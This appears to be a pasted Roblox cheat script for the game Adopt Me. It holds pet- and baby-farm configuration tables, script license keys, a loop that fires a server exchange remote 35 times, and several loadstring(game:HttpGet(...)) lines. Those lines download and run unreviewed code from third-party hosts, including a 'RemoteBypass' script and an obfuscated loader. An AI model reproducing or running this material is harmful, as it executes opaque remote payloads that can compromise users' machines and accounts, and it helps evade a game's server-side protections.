Config = {
    PetFarm = {
        Enabled = true,
        AutoNeon = true,
        FarmUntilFullyGrown = false,
        PrioritizeFriendship = true,
        FarmEggs = false,
        EggType = "cracked_egg",
        SelectFarmEgg = "any",
        BuyEggs = false,
        AutoAgePotionEnabled = false,
        AutoAgePotionPets = { "winter_2024_ice_cube", "winter_2024_berry_cool_cube" },
        ExcludedTasks = {
            Enabled = false,
            Tasks = {
                "camping", "hungry", "thirsty", "sick", "sleepy", "dirty", "bored", "toilet",
                "school", "salon", "beach_party", "pizza_party", "play", "walk", "ride", "moon",
                "pet_me", "catch"
            }
        },
        RarityFarming = {
            Enabled = false,
            Order = { "ultra_rare", "common", "legendary", "rare", "uncommon" }
        }
    },
    BabyFarm = {
        Enabled = true,
        Priority = "PetFirst",
        ExcludedTasks = {
            Enabled = false,
            Tasks = { "camping" }
        }
    },
    Webhook = {
        Enabled = true,
        URL = ""
    }
}
script_key="YDizWtCsoUWCWDMoEGyWgIZZjPCgquVY" loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMeMassFarm.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
for i = 1, 35 do
    local args = {
        "food",
        "butterfly_2025_snapdragon_flower",
        1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("SocialStonesAPI/AttemptExchange"):FireServer(unpack(args))
    task.wait(0.2)
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/butterfly_auto_open.lua"))()
wait(1)


script_key="wuPUyNrPKcRDssQugQwsbVEsUbeVlCrC";
getgenv().Config = {
    ["PetFarmAutoSwitchFullGrown"] = false,
    ["PetFarmActive"] = true,
    ["EggFarmActive"] = false,
    ["HideUselessGui"] = true,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "123456",
    ["Webhook"] = "",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
